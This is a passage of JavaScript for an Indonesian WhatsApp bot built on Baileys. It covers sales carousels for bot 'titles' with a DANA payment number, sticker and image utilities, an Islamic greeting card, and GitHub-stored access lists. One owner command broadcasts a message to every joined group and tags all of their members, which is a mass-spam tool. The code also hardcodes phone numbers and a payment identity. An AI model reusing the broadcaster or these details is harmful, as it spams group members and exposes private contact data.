 url: `https://wa.me/${ownerWa}?text=${encodeURIComponent(`*KONFIRMASI BAYAR SHINIGAMI*\n\nBang udah TF nih\n➥ Dari: @${m.sender.split('@')[0]}\n➥ Tujuan: DANA ${nomorDana}\n➥ Title: Isi title yang di order\n\nCek ya🩸\n\n_Note: Kirim bukti TF setelah ini_`)}`,
 merchant_url: "https://google.com"
 })
 }
 ]

 const cards = [
 // --- SLIDE 1: LIST HARGA + UP ---
 {
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `𝙃𝙖𝙧𝙜𝙖 𝘼𝙡𝙡 𝙎𝙘𝙧𝙞𝙥𝙩 𝘼𝙣𝙙 𝙏𝙞𝙩𝙡𝙚\n━━━━━━━━━━━━━━\n↳ No up - 20k\n↳ Free Up Versi selanjutnya - 30k\n↳ Reseller : 40k\n↳ Partner : 50k\n↳ Owner : 60k\n↳ Tk : 70k\n↳ Mod : 90k\n\n𝙃𝙖𝙧𝙜𝙖 𝙐𝙥 𝙏𝙞𝙩𝙡𝙚\n━━━━━━━━━━━━━━\n↳ No Up → Free Up : 10k\n↳ No Up → Reseller : 20k\n↳ No Up → Partner : 30k\n↳ No Up → Owner : 40k\n↳ No Up → Tk : 50k\n↳ No Up → Mod : 70k\n\n↳ Free Up → Reseller : 10k\n↳ Free Up → Partner : 20k\n↳ Free Up → Owner : 30k\n↳ Free Up → Tk : 40k\n↳ Free Up → Mod : 60k\n\n↳ Reseller → Partner : 10k\n↳ Reseller → Owner : 20k\n↳ Reseller → Tk : 30k\n↳ Reseller → Mod : 50k\n\n↳ Partner → Owner : 10k\n↳ Partner → Tk : 20k\n↳ Partner → Mod : 40k\n\n↳ Owner → Tk : 10k\n↳ Owner → Mod : 30k\n\n↳ Tk → Mod : 20k\n━━━━━━━━━━━━━━\nGeser untuk Payment →`,
 hasMediaAttachment: true,
 ...mediaCard
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: orderBtn("Shinigami")
 })
 },

 // --- SLIDE 2: PAYMENT ---
 {
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙎𝙝𝙞𝙣𝙞𝙜𝙖𝙢𝙞\n━━━━━━━━━━━━━━\n📱 *DANA*\n➤ Nomor : ${nomorDana}\n➤ A/N : ${namaDana}\n\n🧾 *QRIS*\n➤ Scan QR di atas\n➤ All Bank & E-Wallet\n➤ Proses 1-5 Menit\n\n⚠️ *CARA BAYAR:*\n1. TF sesuai nominal\n2. Screenshot bukti\n3. Klik "Konfirmasi Bayar"\n4. Kirim bukti ke owner\n\n❗*FORMAT KONFIRMASI:*\n*KONFIRMASI BAYAR SHINIGAMI*\n\nBang udah TF nih\n➥ Dari: @${m.sender.split('@')[0]}\n➥ Tujuan: DANA ${nomorDana}\n➥ Title: Isi title yang di order\n\nCek ya🩸\n\n_Note: Otomatis keisi pas klik tombol_\n━━━━━━━━━━━━━━`,
 hasMediaAttachment: true,
 ...mediaCard
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: payBtn
 })
 }
 ]

 const msg = generateWAMessageFromContent(m.chat, {
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `Hi \`${m.pushName}\` 👋\nGeser kartu untuk list harga & payment 🩸`
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 text: "© Shinigami System"
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards
 }),
 contextInfo: {
 mentionedJid: [m.sender, ownerWa + '@s.whatsapp.net'],
 externalAdReply: {
 showAdAttribution: true,
 title: '𝙃𝙖𝙧𝙜𝙖 𝘼𝙡𝙡 𝙎𝙘𝙧𝙞𝙥𝙩 𝘼𝙣𝙙 𝙏𝙞𝙩𝙡𝙚',
 body: `Start 20K | UP 10K | DANA ${nomorDana}`,
 thumbnailUrl: qrisUrl,
 sourceUrl: linkGrub,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 })
 }, { quoted: m })

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break

case "upnika": case 'listnika': {
 const { prepareWAMessageMedia, generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys")

 await Asepp.sendMessage(m.chat, { react: { text: "👑", key: m.key } })

 // --- KONFIGURASI ---
 const qrisUrl = "https://litter.catbox.moe/0qdy1e.jpeg"
 const nomorDana = "0882009545852"
 const namaDana = "ASEP"
 const ownerWa = "62881036109288"
 const linkGrub = "https://chat.whatsapp.com/K7P2d0mHyGN82nfTVcX5qq"

 const mediaCard = await prepareWAMessageMedia(
 { image: { url: qrisUrl } },
 { upload: Asepp.waUploadToServer }
 )

 // --- TOMBOL ORDER ---
 const orderBtn = (title) => [
 {
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: "💬 Order " + title,
 url: `https://wa.me/${ownerWa}?text=${encodeURIComponent(`*ORDER NIKA*\n\nHalo bang, mau order:\n➥ Title: ${title}\n➥ Dari: @${m.sender.split('@')[0]}\n\nMohon info payment🩸`)}`,
 merchant_url: "https://google.com"
 })
 },
 {
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: "👥 Join Grup NIKA",
 url: linkGrub,
 merchant_url: "https://google.com"
 })
 }
 ]

 // --- TOMBOL PAYMENT ---
 const payBtn = [
 {
 name: "cta_copy",
 buttonParamsJson: JSON.stringify({
 display_text: "📋 Salin DANA",
 copy_code: nomorDana
 })
 },
 {
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: "⬇️ Download QRIS",
 url: qrisUrl,
 merchant_url: "https://google.com"
 })
 },
 {
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: "✅ Konfirmasi Bayar",
 url: `https://wa.me/${ownerWa}?text=${encodeURIComponent(`*KONFIRMASI BAYAR NIKA*\n\nBang udah TF nih\n➥ Dari: @${m.sender.split('@')[0]}\n➥ Tujuan: DANA ${nomorDana}\n➥ Title: Isi title yang di order\n\nCek ya🩸\n\n_Note: Kirim bukti TF setelah ini_`)}`,
 merchant_url: "https://google.com"
 })
 }
 ]

 const cards = [
 // --- SLIDE 1: LIST HARGA ---
 {
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `𝐍𝐈𝐊𝐀 𝐕𝐈𝐀 𝐖𝐀\n━━━━━━━━━━━━━━\n👑 *TITLE HARGA*\n↳ Reseller : 60K\n↳ Partner : 100K\n↳ Tangan Kanan : 140K\n↳ Owner : 200K\n↳ Mods : 250K\n\n⬆️ *UP TITLE*\n↳ Reseller→PT : 40K\n↳ Reseller→TK : 80K\n↳ Reseller→Owner : 140K\n↳ Reseller→Mods : 190K\n↳ PT→TK : 40K\n↳ PT→Owner : 80K\n↳ PT→Mods : 150K\n↳ TK→Owner : 60K\n↳ TK→Mods : 110K\n↳ Owner→Mods : 50K\n\n❗*FREE UPDATE PERMANEN*\n━━━━━━━━━━━━━━\nGeser untuk Payment →`,
 hasMediaAttachment: true,
 ...mediaCard
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: orderBtn("NIKA")
 })
 },

 // --- SLIDE 2: PAYMENT ---
 {
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐍𝐈𝐊𝐀\n━━━━━━━━━━━━━━\n📱 *DANA*\n➤ Nomor : ${nomorDana}\n➤ A/N : ${namaDana}\n\n🧾 *QRIS*\n➤ Scan QR di atas\n➤ All Bank & E-Wallet\n➤ Proses 1-5 Menit\n\n⚠️ *CARA BAYAR:*\n1. TF sesuai nominal\n2. Screenshot bukti\n3. Klik "Konfirmasi Bayar"\n4. Kirim bukti ke owner\n\n❗*FORMAT OTOMATIS:*\n*KONFIRMASI BAYAR NIKA*\n\nBang udah TF nih\n➥ Dari: @${m.sender.split('@')[0]}\n➥ Tujuan: DANA ${nomorDana}\n➥ Title: Isi title yang di order\n\nCek ya🩸\n━━━━━━━━━━━━━━`,
 hasMediaAttachment: true,
 ...mediaCard
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: payBtn
 })
 }
 ]

 const msg = generateWAMessageFromContent(m.chat, {
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `Hi \`${m.pushName}\` 👋\nGeser kartu untuk list title & bayar 🩸`
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 text: "© NIKA System"
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards
 }),
 contextInfo: {
 mentionedJid: [m.sender, ownerWa + '@s.whatsapp.net'],
 externalAdReply: {
 showAdAttribution: true,
 title: '𝐍𝐈𝐊𝐀 𝐕𝐈𝐀 𝐖𝐀',
 body: `Title 60K | UP 40K | DANA ${nomorDana}`,
 thumbnailUrl: qrisUrl,
 sourceUrl: linkGrub,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 })
 }, { quoted: m })

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break

case 'wm': {
 try {
 if (!m.isGroup) return payreply("Khusus grup!")
 if (!text) return reply('Reply gambar/video/stiker dengan caption: *.wm <packname>*')
 // Ganti await XReaction() menjadi ini:
await Asepp.sendMessage(m.chat, { react: { text: '🕒', key: m.key } })


const tmpDir = path.join(__dirname, 'tmp')
fs.mkdirSync(tmpDir, { recursive: true })

const bufferToTemp = (buf, ext) => {
 const p = path.join(tmpDir, `${Date.now()}_${Math.random().toString(36).slice(2)}.${ext}`)
 fs.writeFileSync(p, buf)
 return p
}

const ffmpegOnce = (inPath, args, outPath) => new Promise((res, rej) => {
 const p = spawn('ffmpeg', ['-y', '-i', inPath, ...args, outPath])
 let err = ''
 p.stderr.on('data', d => err += d.toString())
 p.on('close', c => c === 0 ? res() : rej(new Error(err || ('ffmpeg exit ' + c))))
})

const isAnimatedWebp = (buf) => {
 // deteksi chunk ANIM/ANMF
 const s = buf.toString('binary')
 return s.includes('ANIM') || s.includes('ANMF')
}

// WEBP anim: suntik EXIF packname/author (tetap anim) via node-webpmux
const injectExifWebp = async (inputBuf, packname, author) => {
 const img = new WebpMux.Image()
 await img.load(inputBuf)
 const exifObj = {
 'sticker-pack-id': 'com.Asepp.wm',
 'sticker-pack-name': String(packname || 'Asepp'),
 'sticker-pack-publisher': String(author || ''),
 'emojis': ['🙂']
 }
 const exifBuf = Buffer.concat([
 Buffer.from([0x45,0x78,0x69,0x66,0x00,0x00]), // "Exif\0\0"
 Buffer.from([0x4D,0x4D,0x00,0x2A,0x00,0x00,0x00,0x08]), // minimal TIFF header
 Buffer.from(JSON.stringify(exifObj), 'utf8')
 ])
 img.exif = exifBuf
 return await img.save(null) // Buffer WEBP anim dgn EXIF tertanam
}

// WEBP static → PNG (agar bisa dipasang packname lewat API gambar)
const webpToPng = async (buf) => {
 const inPath = bufferToTemp(buf, 'webp')
 const outPath = inPath.replace(/\.webp$/, '.png')
 await ffmpegOnce(inPath, [], outPath)
 const out = fs.readFileSync(outPath)
 try { fs.unlinkSync(inPath); fs.unlinkSync(outPath) } catch {}
 return out
}

// VIDEO/GIF → WEBP anim 512px (fallback kalau sendVideoAsSticker gagal)
const videoToWebp = async (buf) => {
 const inPath = bufferToTemp(buf, 'mp4')
 const outPath = inPath.replace(/\.mp4$/, '.webp')
 const vf = 'scale=512:512:force_original_aspect_ratio=decrease,fps=15,format=rgba,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=ffffff@0'
 await ffmpegOnce(inPath, ['-vf', vf, '-loop','0','-lossless','1','-an','-vsync','0','-preset','picture','-qscale','50'], outPath)
 const out = fs.readFileSync(outPath)
 try { fs.unlinkSync(inPath); fs.unlinkSync(outPath) } catch {}
 return out
}


 // ambil pesan yang direply (atau pesan sendiri)
 const q = m.quoted ? m.quoted : m
 const mime = (q.msg || q).mimetype || ''
 const mtype = q.mtype || ''
 const packname = text.trim()
 const author = '' // isi jika ingin menampilkan author

 const media = await Asepp.downloadMediaMessage(q).catch(() => null)
 if (!media) return reply('⚠️ Media tidak ditemukan / gagal diunduh.')

 const isSticker = /sticker/i.test(mtype) || /webp/i.test(mime)
 const isImage = /image/i.test(mime) && !isSticker
 const isVideo = /video/i.test(mime)

 // ====== STICKER (WEBP) INPUT ======
 if (isSticker) {
 if (isAnimatedWebp(media)) {
 // WEBP anim → suntik EXIF (packname/author) tanpa akses root
 try {
 const withExif = await injectExifWebp(media, packname, author)
 await Asepp.sendMessage(m.chat, { sticker: withExif }, { quoted: m })
 } catch (e) {
 // fallback: kirim apa adanya biar tetap bisa dipakai
 await Asepp.sendMessage(m.chat, { sticker: media }, { quoted: m })
 }
 } else {
 // WEBP statis → convert PNG → kirim sebagai sticker image dgn packname
 const png = await webpToPng(media)
 await Asepp.sendImageAsSticker(m.chat, png, m, { packname, author })
 }
 return
 }

 // ====== IMAGE INPUT ======
 if (isImage) {
 await Asepp.sendImageAsSticker(m.chat, media, m, { packname, author })
 return
 }

 // ====== VIDEO/GIF INPUT ======
 if (isVideo) {
 const sec =
 (q.msg && (q.msg.seconds || q.msg.duration)) ||
 q.seconds || q.duration || 0
 if (Number(sec) > 10) return reply('Maksimal 10 detik!')

 // coba bawaan lib dulu
 try {
 await Asepp.sendVideoAsSticker(m.chat, media, m, { packname, author })
 } catch {
 // fallback ffmpeg → WEBP anim
 const webp = await videoToWebp(media)
 await Asepp.sendMessage(m.chat, { sticker: webp }, { quoted: m })
 }
 return
 }

 // selain itu
 return reply('Reply gambar/video/stiker dengan caption *.wm <packname>*')

 } catch (e) {
 console.error('wm error:', e)
 return reply('❌ Error saat memproses WM (pure-JS). Coba kirim ulang medianya.')
 }
}
case "iqc": {
 if (!text) return payreply(`_*Teks Nya Mana Woy Jembut🗿*_`);

 // 1. Definisikan jam otomatis agar tidak error
 let date = new Date();
 let time = date.toLocaleTimeString('id-ID', { 
 hour: '2-digit', 
 minute: '2-digit', 
 hour12: false, 
 timeZone: 'Asia/Jakarta' 
 }).replace('.', ':');

 // 2. Pakai 'text' sebagai isi pesan (q biasanya tidak terdefinisi di beberapa base)
 const pesan = text.trim();
 const battery = Math.floor(Math.random() * 100) + 1;

 // 3. Susun URL API
 const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=INDOSAT&messageText=${encodeURIComponent(pesan)}&emojiStyle=apple`;
 
 try {
 // 4. Ganti 'client' jadi 'Asepp' sesuai variabel botmu
 await Asepp.sendMessage(m.chat, {
 image: { url },
 caption: "*_iPhone Quoted Message ShinigamiVersion4_*"
 }, { quoted: m });
 } catch (err) {
 console.error(err);
 payreply("⚠️ API sedang gangguan atau link gambar tidak valid.");
 }
}
break;

case 'assalamualaikum':
case 'assalam':
case 'asalam':
case 'aslm': {
 // 1. Persiapan Media Gambar tiap Kartu
 const media1 = await prepareWAMessageMedia(
 { image: { url: "https://img2.pixhost.to/images/7322/716834527_asepp.jpg" } },
 { upload: Asepp.waUploadToServer }
 );

 const media2 = await prepareWAMessageMedia(
 { image: { url: "https://img2.pixhost.to/images/7322/716834533_asepp.jpg" } },
 { upload: Asepp.waUploadToServer }
 );

 // 2. Kirim via relayMessage agar Carousel Aktif
 await Asepp.relayMessage(from, {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: {
 text: `*Wa'alaikumussalam Warahmatullahi Wabarakatuh*\n\n` +
 `_"Sebarkanlah salam di antara kalian, niscaya kalian akan saling mencintai."_ (HR. Muslim)\n\n` +
 `Berikut adalah kumpulan dalil dan hadits lengkap mengenai keutamaan salam. *Silakan geser kartu* untuk membaca lebih banyak! 👇`
 },
 footer: {
 text: "Asepp System • Library Hadits Salam"
 },
 header: {
 hasMediaAttachment: false
 },
 carouselMessage: {
 cards: [
 {
 header: {
 title: "📜 KUMPULAN HADITS SALAM (1)",
 hasMediaAttachment: true,
 ...media1
 },
 body: {
 text: `1. *Pahala Sempurna:* Mengucap salam lengkap (Wabarakatuh) dicatat 30 kebaikan. (HR. Tirmidzi)\n` +
 `2. *Amalan Terbaik:* Memberi makan & mengucap salam pada yang dikenal/tidak. (HR. Bukhari)\n` +
 `3. *Penggugur Dosa:* Bersalaman saat bertemu menggugurkan dosa sebelum berpisah. (HR. Abu Daud)\n` +
 `4. *Utama di Sisi Allah:* Orang yang paling utama adalah yang memulai salam. (HR. Abu Daud)\n` +
 `5. *Kunci Surga:* Sebarkan salam, beri makan, shalat malam = Surga. (HR. Ibnu Majah)\n` +
 `6. *Keberkahan Rumah:* Salam saat masuk rumah membawa berkah bagi penghuninya. (HR. Tirmidzi)\n` +
 `7. *Hak Muslim:* Menjawab salam adalah salah satu dari 6 hak muslim. (HR. Muslim)\n` +
 `8. *Salam di Majelis:* Ucapkan salam saat datang dan saat berpamitan. (HR. Tirmidzi)`
 },
 nativeFlowMessage: {
 buttons: [{
 name: "quick_reply",
 buttonParamsJson: JSON.stringify({ display_text: "Masya Allah", id: "salam1" })
 }]
 }
 },
 {
 header: {
 title: "📖 ADAB & DALIL QURAN (2)",
 hasMediaAttachment: true,
 ...media2
 },
 body: {
 text: `• *Aturan Berpapasan:* Yang berkendara salam ke yang berjalan, yang berjalan ke yang duduk, yang sedikit ke yang banyak. (HR. Bukhari)\n` +
 `• *Kepada Anak-anak:* Rasulullah ﷺ selalu memberi salam pada anak kecil yang dilewatinya. (HR. Muslim)\n` +
 `• *Perintah Quran:* "Apabila kamu dihormati dengan suatu salam, maka balaslah dengan yang lebih baik." (QS. An-Nisa: 86)\n` +
 `• *Salam Penghuni Surga:* "Dan malaikat masuk ke tempat mereka dari semua pintu (sambil berkata): Salamun 'Alaikum." (QS. Ar-Ra'd: 23-24)\n` +
 `• *Nama Allah:* 'As-Salam' adalah salah satu nama Allah yang diletakkan di bumi. (HR. Bukhari)\n` +
 `• *Mengusir Setan:* Setan tidak bisa ikut menginap di rumah yang salamnya diucapkan. (HR. Muslim)\n` +
 `• *Jaminan Keamanan:* Salam adalah janji keamanan antar sesama muslim.`
 },
 nativeFlowMessage: {
 buttons: [{
 name: "quick_reply",
 buttonParamsJson: JSON.stringify({ display_text: "Subhanallah", id: "salam2" })
 }]
 }
 }
 ]
 }
 }
 }
 }
 }, { quoted: m });
}
break;














case 'clearakses': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const AKSES_PATH = `database/akses.json`

 const axios = require('axios')
 payreply('Proses clear semua akses...')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AKSES_PATH}`
 const getRes = await axios.get(getUrl, {
 })

 let db = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 const totalSebelum = db.akses?.length || 0

 if (totalSebelum === 0) return payreply('List akses udah kosong 🩸')

 db.akses = [] // Kosongin array
 const newContent = Buffer.from(JSON.stringify(db, null, 2)).toString('base64')

 await axios.put(getUrl, {
 message: `clearakses: hapus ${totalSebelum} akses`,
 content: newContent,
 sha: getRes.data.sha
 }, {
 })

 payreply(`Sukses clear akses 🩸\n${totalSebelum} orang dicabut aksesnya\nSekarang cuma lu yang bisa adddb/deldb`)

 } catch (e) {
 if (e.response?.status === 404) {
 return payreply('File akses.json ga ada 🩸')
 }
 payreply(`Gagal clear: ${e.response?.data?.message || 'Error'}`)
 }
}
break

 
 case 'listgh': {
 const sender = m.sender.split('@')[0]
 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const AKSES_PATH = `database/akses.json`
 const DB_PATH = `database/database.json`
 const axios = require('axios')

 // CEK AKSES
 let punyaAkses = sender === '62881036109288'
 if (!punyaAkses) {
 try {
 const aksesUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AKSES_PATH}`
 const aksesRes = await axios.get(aksesUrl, {
 })
 const aksesDb = JSON.parse(Buffer.from(aksesRes.data.content, 'base64').toString())
 if (aksesDb.akses?.includes(sender)) punyaAkses = true
 } catch (e) {}
 }
 if (!punyaAkses) return payreply('Lu ga punya akses buat liat database 🩸')

 payreply('Lagi ambil database dari GitHub...')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${DB_PATH}`
 const getRes = await axios.get(getUrl, {
 })

 const db = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 if (!db.Numbers || db.Numbers.length === 0) return payreply('Database kosong 🩸')

 let teks = `*LIST DATABASE GITHUB* 🩸\n\n`
 let mentions = []
 db.Numbers.forEach((nomor, i) => {
 teks += `${i + 1}. @${nomor}\n`
 mentions.push(nomor + '@s.whatsapp.net')
 })
 teks += `\nTotal: ${db.Numbers.length} nomor`
 payreply(teks, mentions)
 } catch (e) {
 if (e.response?.status === 404) return payreply('File database.json belum ada 🩸')
 payreply(`Gagal ambil database: ${e.response?.data?.message || 'Error'}`)
 }
}
break
case 'listakses': {
 const sender = m.sender.split('@')[0]
 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const AKSES_PATH = `database/akses.json`
 const axios = require('axios')

 // CEK AKSES
 let punyaAkses = sender === '62881036109288'
 if (!punyaAkses) {
 try {
 const aksesUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AKSES_PATH}`
 const aksesRes = await axios.get(aksesUrl, {
 })
 const aksesDb = JSON.parse(Buffer.from(aksesRes.data.content, 'base64').toString())
 if (aksesDb.akses?.includes(sender)) punyaAkses = true
 } catch (e) {}
 }
 if (!punyaAkses) return payreply('Lu ga punya akses buat liat list 🩸')

 payreply('Lagi cek list akses...')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AKSES_PATH}`
 const getRes = await axios.get(getUrl, {
 })

 const db = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 if (!db.akses || db.akses.length === 0) return payreply('Belum ada yang punya akses selain super admin 🩸')

 let teks = `*LIST YANG PUNYA AKSES* 🩸\n\n`
 teks += `*Super Admin:*\n@62881036109288\n\n`
 teks += `*Member Akses:*\n`
 let mentions = ['62881036109288@s.whatsapp.net']

 db.akses.forEach((nomor, i) => {
 teks += `${i + 1}. @${nomor}\n`
 mentions.push(nomor + '@s.whatsapp.net')
 })
 teks += `\nTotal: ${db.akses.length} orang`
 payreply(teks, mentions)
 } catch (e) {
 if (e.response?.status === 404) return payreply('File akses.json belum ada 🩸')
 payreply(`Gagal ambil list: ${e.response?.data?.message || 'Error'}`)
 }
}
break
case 'listakses': {
 const sender = m.sender.split('@')[0]
 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const AKSES_PATH = `database/akses.json`
 const axios = require('axios')

 // CEK AKSES
 let punyaAkses = sender === '62881036109288'
 if (!punyaAkses) {
 try {
 const aksesUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AKSES_PATH}`
 const aksesRes = await axios.get(aksesUrl, {
 })
 const aksesDb = JSON.parse(Buffer.from(aksesRes.data.content, 'base64').toString())
 if (aksesDb.akses?.includes(sender)) punyaAkses = true
 } catch (e) {}
 }
 if (!punyaAkses) return payreply('Lu ga punya akses buat liat list 🩸')

 payreply('Lagi cek list akses...')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AKSES_PATH}`
 const getRes = await axios.get(getUrl, {
 })

 const db = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 if (!db.akses || db.akses.length === 0) return payreply('Belum ada yang punya akses selain super admin 🩸')

 let teks = `*LIST YANG PUNYA AKSES* 🩸\n\n`
 teks += `*Super Admin:*\n@62881036109288\n\n`
 teks += `*Member Akses:*\n`
 let mentions = ['62881036109288@s.whatsapp.net']

 db.akses.forEach((nomor, i) => {
 teks += `${i + 1}. @${nomor}\n`
 mentions.push(nomor + '@s.whatsapp.net')
 })
 teks += `\nTotal: ${db.akses.length} orang`
 payreply(teks, mentions)
 } catch (e) {
 if (e.response?.status === 404) return payreply('File akses.json belum ada 🩸')
 payreply(`Gagal ambil list: ${e.response?.data?.message || 'Error'}`)
 }
}
break
case 'delakses': {
 const sender = m.sender.split('@')[0]
 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const AKSES_PATH = `database/akses.json`
 const axios = require('axios')

 // CEK AKSES
 let punyaAkses = sender === '62881036109288'
 if (!punyaAkses) {
 try {
 const aksesUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AKSES_PATH}`
 const aksesRes = await axios.get(aksesUrl, {
 })
 const aksesDb = JSON.parse(Buffer.from(aksesRes.data.content, 'base64').toString())
 if (aksesDb.akses?.includes(sender)) punyaAkses = true
 } catch (e) {}
 }
 if (!punyaAkses) return payreply('Lu ga punya akses buat delakses 🩸')

 let nomor = ''
 if (m.quoted) nomor = m.quoted.sender.split('@')[0]
 else if (m.mentionedJid?.[0]) nomor = m.mentionedJid[0].split('@')[0]
 else if (text) nomor = text.replace(/[^0-9]/g, '')

 if (!nomor) return payreply(`Reply chat / tag orang / ketik nomor\nContoh: ${prefix}delakses 6281234567890`)
 if (nomor === '62881036109288') return payreply('Gabisa cabut akses super admin 🩸')
 if (nomor === sender) return payreply('Gabisa cabut akses diri sendiri 🩸')

 payreply('Proses cabut akses...')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AKSES_PATH}`
 const getRes = await axios.get(getUrl, {
 })
 let db = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())

 const index = db.akses.indexOf(nomor)
 if (index === -1) return payreply(`@${nomor} ga ada di list akses 🩸`, [nomor + '@s.whatsapp.net'])

 db.akses.splice(index, 1)
 const newContent = Buffer.from(JSON.stringify(db, null, 2)).toString('base64')

 await axios.put(getUrl, {
 message: `delakses: ${nomor} by ${sender}`,
 content: newContent,
 sha: getRes.data.sha
 }, {
 })

 payreply(`Akses @${nomor} dicabut sama @${sender} 🩸\nSisa akses: ${db.akses.length}`, [nomor + '@s.whatsapp.net', sender + '@s.whatsapp.net'])
 } catch (e) {
 payreply('Gagal cabut akses')
 }
}
break

case 'menugh':


case 'jpm': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')

 const groups = await Asepp.groupFetchAllParticipating()
 const groupList = Object.values(groups)

 let q = m.quoted? m.quoted : m
 let mime = (q.msg || q).mimetype || ''
 let caption = text || q.text || ''

 if (!/image|video|text/.test(mime) &&!caption) {
 return payreply(`Kirim/reply text/image/video buat JPM 🩸\nContoh:.jpm Halo semua`)
 }

 payreply(`Proses JPM ke ${groupList.length} group + tag all member... 🩸`)

 let sukses = 0
 let gagal = 0

 for (let gc of groupList) {
 await sleep(3500) // Naikin delay biar aman
 try {
 let participants = gc.participants.map(v => v.id)

 if (/image/.test(mime)) {
 let media = await q.download()
 await Asepp.sendMessage(gc.id, {
 image: media,
 caption: caption,
 mentions: participants
 })
 } else if (/video/.test(mime)) {
 let media = await q.download()
 await Asepp.sendMessage(gc.id, {
 video: media,
 caption: caption,
 gifPlayback: /gif/.test(mime),
 mentions: participants
 })
 } else {
 await Asepp.sendMessage(gc.id, {
 text: caption,
 mentions: participants
 })
 }
 sukses++
 } catch (e) {
 gagal++
 console.log(`JPM gagal ke ${gc.subject}:`, e.message)
 }
 }

 payreply(`*JPM SELESAI* 🩸\n\nSukses: ${sukses} group\nGagal: ${gagal} group\nTotal: ${groupList.length} group`)
}
break

case 'menugh':





case 'listtandagc':
case 'listtaggc': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const TANDA_PATH = `database/tandagc.json`
 const axios = require('axios')

 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } })

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${TANDA_PATH}`
 const getRes = await axios.get(getUrl, {
 })

 const db = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 if (!db.list || db.list.length === 0) return payreply('Belum ada group yang ditandai 🩸')

 let teks = `\`𝗟𝗜𝗦𝗧 𝗚𝗥𝗢𝗨𝗣 𝗚𝗜𝗧𝗛𝗨𝗕 𝗗𝗕\`

Hi \`${pushname}\` 👋 Ini semua group yang udah lu tandain buat akses GH DB 🩸

⌲ \`𝐓𝐎𝐓𝐀𝐋 𝐆𝐑𝐎𝐔𝐏\`
┏━━━━━━━━━━━━━━━━
┃✦ *Ditandai » ${db.list.length} group*
┃✦ *Owner DB » Wahyu*
┃✦ *Developer » Asepp*
┗━━━━━━━━━━━━━━━━━━\n\n`

 let mentions = []
 const groups = await Asepp.groupFetchAllParticipating()

 for (let [i, gc] of db.list.entries()) {
 const groupData = groups[gc.id]
 const namaGc = groupData?.subject || gc.name || 'Group Dihapus' // <-- FIX DISINI
 const totalMember = groupData? groupData.participants.length : 0
 const ownerGc = groupData?.owner || groupData?.participants.find(v => v.admin === 'superadmin')?.id

 let ownerName = 'Kosong'
 if (ownerGc) {
 ownerName = `@${ownerGc.split('@')[0]}`
 mentions.push(ownerGc)
 }

 teks += `⌲ \`𝐆𝐑𝐎𝐔𝐏 ${i+1}\`\n`
